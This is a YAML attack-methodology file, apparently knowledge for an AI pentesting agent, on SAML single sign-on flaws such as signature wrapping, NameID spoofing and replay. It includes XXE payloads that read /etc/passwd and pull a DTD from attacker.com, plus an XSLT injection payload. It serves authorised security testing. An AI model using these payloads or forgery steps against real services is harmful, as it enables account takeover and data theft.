@@ -1,0 +1,232 @@
+id: SAML
+name: SAML SSO Vulnerabilities
+cwe:
+- CWE-287
+- CWE-347
+- CWE-290
+- CWE-611
+owasp: A07:2021 Identification and Authentication Failures
+severity_range: High - Critical
+description: >
+  SAML (Security Assertion Markup Language) is the backbone of enterprise SSO.
+  Implementation flaws in SAML processing can allow authentication bypass,
+  account takeover, privilege escalation, and full SSO compromise. Because
+  SAML assertions are XML documents with cryptographic signatures, the attack
+  surface spans XML parsing, signature verification, assertion validation,
+  and session management.
+
+detection:
+  prerequisites:
+  - Identify the SAML flow by intercepting the login redirect chain
+  - Capture a valid SAMLResponse (base64-encoded assertion) via browser devtools or proxy
+  - Identify the IdP URL, ACS (Assertion Consumer Service) URL, and SP entity ID
+  - Decode the SAMLResponse to understand the assertion structure
+
+  strategy:
+  - '1. Intercept the SAML flow: request protected resource → IdP redirect → authenticate → SAMLResponse POST to ACS'
+  - '2. Capture and decode the SAMLResponse (base64 → XML)'
+  - '3. Identify signature algorithm, certificate, NameID, conditions, and audience'
+  - '4. Test signature removal — does the SP accept unsigned assertions?'
+  - '5. Test signature wrapping (XSW) — move the signed assertion and inject a new unsigned one'
+  - '6. Test NameID manipulation — change the authenticated user identity'
+  - '7. Test assertion replay — re-submit an old assertion after expiry'
+  - '8. Test XXE via the SAML XML — inject external entities in the assertion'
+  - '9. Test XSLT injection in the assertion if the SP processes transforms'
+  - '10. Test recipient/audience validation — submit assertion to wrong SP'
+  - '11. Test comment injection in NameID to bypass validation'
+  - '12. Test assertion condition manipulation (NotBefore/NotOnOrAfter)'
+
+  attack_classes:
+    signature_exclusion:
+      description: >
+        Remove the Signature element entirely from the SAML assertion
+        or response. If the SP doesn't require signatures, any forged
+        assertion will be accepted.
+      test_steps:
+      - Decode the SAMLResponse from base64
+      - Remove the entire <ds:Signature> block
+      - Re-encode to base64 and submit to ACS
+      - If the SP accepts it, signature validation is missing
+      severity: critical
+      impact: Complete authentication bypass — forge assertion for any user
+
+    signature_wrapping_xsw:
+      description: >
+        XML Signature Wrapping attacks exploit the disconnect between
+        the signed XML element and the element the SP actually processes.
+        There are 8 known XSW variants that move the signature to cover
+        a different part of the document while injecting a malicious
+        unsigned assertion that the SP processes.
+      variants:
+      - 'XSW1: Move Response Signature before the manipulated Assertion'
+      - 'XSW2: Wrap a new unsigned Assertion after the signed one in the Response'
+      - 'XSW3: Insert a new Assertion before the signed Assertion'
+      - 'XSW4: Wrap original Assertion inside a new parent and add malicious sibling'
+      - 'XSW5: Move signed Assertion into SignedInfo, add new root Assertion'
+      - 'XSW6: Same as XSW5 but append to different location'
+      - 'XSW7: Add an Extensions element with a cloned modified Assertion'
+      - 'XSW8: Move original Assertion into Object element of Signature'
+      test_steps:
+      - Decode the SAMLResponse
+      - 'For each XSW variant: restructure the XML as described'
+      - Change the NameID in the unsigned (attacker-controlled) assertion
+      - Re-encode and submit to ACS
+      - Check if the SP processes the unsigned assertion
+      severity: critical
+      impact: Authentication bypass — impersonate any user while keeping a valid signature
+      tool_note: Use SAMLRaider Burp extension or saml_tool.py for automated XSW testing
+
+    nameid_manipulation:
+      description: >
+        Modify the NameID (the element that identifies the authenticated
+        user) in the SAML assertion. If signatures are not verified or
+        can be bypassed via XSW, changing the NameID to admin@company.com
+        gives admin access.
+      test_steps:
+      - Decode the SAMLResponse
+      - Locate the <NameID> element
+      - Change the value to a target user (admin@company.com)
+      - If signature is enforced, combine with XSW or signature exclusion
+      - Re-encode and submit
+      severity: critical
+      impact: Account takeover — authenticate as any user
+
+    comment_injection:
+      description: >
+        Some XML parsers handle comments differently during signature
+        validation vs value extraction. Injecting a comment inside the
+        NameID can cause the SP to validate "user" but extract "admin".
+        Example: <NameID>user@evil.com<!---->@company.com</NameID>
+        The signature covers the full text including comment, but some
+        processors strip comments and see user@evil.com@company.com
+        or just user@evil.com.
+      test_steps:
+      - Insert XML comments inside the NameID value
+      - 'Test: admin<!--comment-->@evil.com'
+      - 'Test: user<!---->.admin@company.com'
+      - Check if the SP extracts a different identity than what was signed
+      severity: high
+      impact: Identity spoofing via parser differential
+
+    assertion_replay:
+      description: >
+        Re-submit a previously captured SAML assertion after the session
+        has ended or the assertion has expired. If the SP doesn't track
+        used assertions or enforce NotOnOrAfter conditions, replayed
+        assertions create new valid sessions.
+      test_steps:
+      - Capture a valid SAMLResponse during login
+      - Log out completely
+      - Re-submit the same SAMLResponse to the ACS endpoint
+      - If a new session is created, replay is possible
+      - Also test with expired assertions (modify NotOnOrAfter to future date)
+      severity: high
+      impact: Session hijacking via replayed assertions
+
+    xxe_via_saml:
+      description: >
+        SAML assertions are XML documents. If the SP's XML parser has
+        external entity processing enabled, XXE attacks can be injected
+        inside the SAML XML to read files, perform SSRF, or exfiltrate data.
+      payloads:
+      - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><Response><NameID>&xxe;</NameID></Response>'
+      - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><Response/>'
+      test_steps:
+      - Decode the SAMLResponse
+      - Inject XXE payload at the beginning of the XML
+      - Reference the entity inside NameID or AttributeValue
+      - Re-encode and submit to ACS
+      - Check response for file content or OOB callback
+      severity: high
+      impact: File read, SSRF, or data exfiltration via the SP's XML parser
+
+    xslt_injection:
+      description: >
+        If the SP processes XSLT transforms as part of XML signature
+        verification, injecting malicious XSLT can achieve code execution.
+      payloads:
+      - '<ds:Transform Algorithm="http://www.w3.org/TR/1999/REC-xslt-19991116"><xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:value-of select="system-property(''xsl:vendor'')"/></xsl:template></xsl:stylesheet></ds:Transform>'
+      severity: critical
+      impact: Remote code execution via XSLT processing
+
+    recipient_confusion:
+      description: >
+        Submit a SAML assertion intended for Service Provider A to
+        Service Provider B. If SP-B doesn't validate the Audience
+        restriction or Recipient field, it accepts an assertion meant
+        for a different application.
+      test_steps:
+      - Capture a valid assertion for SP-A
+      - Submit it to SP-B's ACS endpoint
+      - If SP-B creates a session, audience validation is missing
+      severity: high
+      impact: Cross-application authentication bypass
+
+    condition_manipulation:
+      description: >
+        Modify the NotBefore and NotOnOrAfter conditions in the assertion
+        to extend its validity period. If the SP doesn't independently
+        verify these conditions against its own clock, expired or future
+        assertions are accepted.
+      test_steps:
+      - Decode the assertion
+      - Change NotOnOrAfter to a date far in the future (2030-01-01)
+      - Change NotBefore to a date in the past
+      - Re-encode and submit
+      severity: medium
+      impact: Assertion validity window bypass
+
+    idp_confusion:
+      description: >
+        If the SP trusts multiple IdPs, submit an assertion signed by
+        a less-trusted IdP (or an attacker-controlled IdP) to gain
+        access. This exploits SP configurations that don't restrict
+        which IdP can assert which identities.
+      test_steps:
+      - Identify all trusted IdPs from SP metadata
+      - Set up a rogue IdP (e.g., using SimpleSAMLphp)
+      - Generate a valid assertion signed by the rogue IdP
+      - Submit to the SP's ACS endpoint
+      severity: critical
+      impact: Full authentication bypass via rogue IdP
+
+    metadata_poisoning:
+      description: >
+        If the SP fetches IdP metadata from a URL rather than a static
+        file, intercepting or redirecting that URL allows replacing the
+        IdP's signing certificate with the attacker's, making all
+        forged assertions pass signature validation.
+      test_steps:
+      - Check if SP metadata URL is HTTP (not HTTPS)
+      - Test SSRF to make the SP refetch metadata from attacker URL
+      - Check if SP has metadata refresh/reload endpoint
+      severity: critical
+      impact: Complete SSO takeover via certificate replacement
+
+evidence_needed: >
+  Successful authentication as a different user via manipulated SAML
+  assertion, or data exfiltration via XXE in the SAML XML.
+
+tools:
+- http_request
+- record_finding
+
+ai_research_hints:
+- Check if the SP uses XML canonicalization (C14N) — some implementations have normalization bugs
+- Test if the IdP signs the Response element, the Assertion element, or both — XSW attacks differ based on this
+- Look for SAML debug endpoints (/saml/debug, /saml/metadata, /saml/test) that leak configuration
+- Check if SAML metadata endpoint is publicly accessible and reveals signing certificates
+- Test if the SP's SAML library version has known CVEs (check xmlsec, python3-saml, ruby-saml, spring-security-saml)
+- Look for IdP-initiated SSO flows which are more vulnerable to replay and injection
+- Check if the SP processes EncryptedAssertion — encryption without authentication can be dangerous
+- Test InResponseTo validation — remove it to see if unsolicited assertions are accepted
+- Check SAML logout (SLO) for similar vulnerabilities — LogoutRequest manipulation
+
+references:
+- https://portswigger.net/web-security/saml
+- https://research.aurainfosec.io/bypassing-saml20-SSO
+- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SAML
+- https://www.usenix.org/conference/usenixsecurity12/technical-sessions/presentation/somorovsky
+- https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/
+- https://book.hacktricks.xyz/pentesting-web/saml-attacks
+- https://github.com/CompassSecurity/SAMLRaider
